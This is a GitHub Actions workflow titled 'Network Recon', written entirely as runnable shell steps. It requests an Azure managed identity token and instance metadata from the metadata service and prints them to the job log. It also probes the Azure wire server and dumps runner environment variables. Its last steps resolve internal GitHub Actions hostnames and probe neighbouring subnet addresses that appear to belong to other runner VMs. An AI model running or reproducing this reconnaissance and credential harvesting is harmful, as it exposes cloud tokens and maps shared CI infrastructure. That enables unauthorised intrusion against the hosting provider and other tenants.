name: Network Recon
on:
  push:
    branches: [main]
  workflow_dispatch:
jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: IMDS managed identity token
        run: |
          echo "=== Azure managed identity token ==="
          curl -sf --max-time 3 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true" 2>&1 || echo "no_managed_identity"
          
          echo "=== IMDS subscription ==="
          curl -sf --max-time 3 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true" | python3 -c "import json,sys; d=json.load(sys.stdin); c=d.get('compute',{}); print('sub:', c.get('subscriptionId')); print('rg:', c.get('resourceGroupName')); print('vm:', c.get('name'))" 2>&1

      - name: Wire server and internal endpoints
        run: |
          echo "=== Azure Wire Server 168.63.129.16 ==="
          curl -sf --max-time 3 http://168.63.129.16/ 2>&1 | head -3 || echo "blocked"
          
          echo "=== Actions env vars ==="
          env | sort | grep -i "ACTIONS\|RUNNER\|GITHUB_API\|GITHUB_ENV\|GITHUB_STEP" | sed 's/TOKEN=.*/TOKEN=REDACTED/'

      - name: DNS recon github internal
        run: |
          echo "=== github.net DNS ==="
          for h in pipelines.github.net actions.github.net vstoken.actions.githubusercontent.com results-receiver.actions.githubusercontent.com; do
            printf "$h -> "; dig +short $h 2>/dev/null | head -1 || echo "unresolved"
          done
          
          echo "=== Subnet neighbors (10.1.0.x) ==="
          for ip in 10.1.0.1 10.1.0.2 10.1.0.114 10.1.0.116; do
            printf "HTTP $ip: "
            curl -sf --max-time 1 http://$ip/ 2>&1 | head -1 || echo "no_response"
          done
          
          echo "=== Check cross-runner DNS (same subnet, other runner VMs) ==="
          nslookup -type=PTR 10.1.0.114 2>&1 | grep -v "^$" | head -5 || true
          nslookup -type=PTR 10.1.0.116 2>&1 | grep -v "^$" | head -5 || true
